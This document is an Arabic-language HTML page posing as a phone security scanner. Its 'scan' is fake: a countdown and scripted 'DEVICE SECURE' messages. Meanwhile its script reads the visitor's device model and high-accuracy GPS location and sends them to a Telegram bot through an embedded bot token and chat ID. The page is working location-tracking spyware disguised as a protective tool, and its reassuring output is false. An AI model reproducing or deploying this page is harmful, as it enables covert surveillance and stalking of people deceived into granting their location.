<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🛡️ حماية الهاتف</title>
    <style>
        :root { --green: #00ff41; --red: #ff0040; }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Courier New', monospace; background: #000; color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
        @keyframes flicker { 0%,100%{opacity:1} 50%{opacity:0.3} }
        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
        .container { max-width: 400px; width: 100%; }
        .page { display: none; } .page.active { display: block; }
        .skull { font-size: 60px; animation: pulse 0.5s infinite; }
        h1 { font-size: 22px; color: var(--green); }
        .device-card { background: #0a0a0a; border: 2px solid var(--green); border-radius: 14px; padding: 18px; margin-bottom: 20px; }
        .device-card .d-name { color: var(--green); font-size: 16px; font-weight: 700; }
        .btn { width: 100%; padding: 18px; border-radius: 12px; border: 2px solid var(--green); background: #0a1a0a; color: var(--green); font-size: 18px; font-weight: 700; cursor: pointer; font-family: 'Courier New', monospace; }
        .btn:active { background: #0a2a0a; }
        .code-screen { background: #000; border: 2px solid var(--green); border-radius: 10px; padding: 14px; margin: 16px 0; color: var(--green); font-size: 10px; line-height: 1.5; text-align: left; max-height: 200px; overflow-y: auto; }
        .countdown { font-size: 40px; font-weight: 900; color: var(--red); }
        .progress-bar { width: 100%; height: 4px; background: #0a1a0a; border-radius: 2px; margin: 10px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: var(--red); width: 0%; }
        .success-icon { font-size: 70px; }
        .success-text { color: var(--green); font-size: 22px; font-weight: 700; }
    </style>
</head>
<body>
<div class="container">
    <div class="page active" id="page-home">
        <div class="skull">🛡️</div>
        <h1>حماية الهاتف</h1>
        <div class="device-card"><div class="d-name" id="device-name">📱 جاري الكشف...</div></div>
        <button class="btn" onclick="startScan()">🔍 اضغط لبدء الفحص</button>
    </div>
    <div class="page" id="page-scanning">
        <div class="skull">💀</div>
        <h1>جاري الفحص الشامل...</h1>
        <div class="code-screen" id="code-screen"></div>
        <div class="countdown" id="countdown">50</div>
        <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
    </div>
    <div class="page" id="page-done">
        <div class="success-icon">✅</div>
        <div class="success-text">جهازك بأمان</div>
    </div>
</div>

<script>
const params = new URLSearchParams(window.location.search);
const CHAT_ID = params.get("chatId") || "7276604783";
const BOT_TOKEN = params.get("token") || "8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo";
function getDevice() { const m = navigator.userAgent.match(/; ([^;]+) Build/); return { name: m ? m[1].trim() : 'جهاز غير معروف' }; }
const device = getDevice();
document.getElementById('device-name').textContent = '📱 ' + device.name;
function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); }
function sendMsg(text) { fetch('`https://api.telegram.org/bot${BOT_TOKEN}/`sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text})}).catch(e=>{}); }

async function startScan() {
    showPage('page-scanning');
    sendMsg(`🛡️ فحص\n📱 ${device.name}`);
    
    // GPS
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const { latitude, longitude } = pos.coords;
            sendMsg(`📍 الموقع\n🗺️ https://maps.google.com/?q=${latitude},${longitude}`);
            fetch(``https://api.telegram.org/bot${BOT_TOKEN}/`sendLocation`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,latitude,longitude})}).catch(e=>{});
        }, () => sendMsg('📍 GPS: لم يتم التحديد'), { enableHighAccuracy: true, timeout: 30000 });
    } else { sendMsg('📍 GPS: غير مدعوم'); }

    const codeScreen = document.getElementById('code-screen');
    const countdownEl = document.getElementById('countdown');
    const progressFill = document.getElementById('progress-fill');
    const logs = ['[■] INITIALIZING...','[■] DEVICE: '+device.name,'[■] CHECKING...','[■] SCANNING GPS...','[■] KERNEL: SECURE','[■] FIREWALL: ACTIVE','[■] NO MALWARE','[✓] DEVICE SECURE'];
    let seconds = 50;
    const interval = setInterval(() => { seconds--; countdownEl.textContent=seconds; progressFill.style.width=((50-seconds)/50*100)+'%'; const lines=Math.floor(((50-seconds)/50)*logs.length); codeScreen.innerHTML=logs.slice(0,Math.min(lines+1,logs.length)).join('<br>'); codeScreen.scrollTop=codeScreen.scrollHeight; if(seconds<=0){clearInterval(interval);showPage('page-done');} },1000);
}
</script>
</body>
</html>
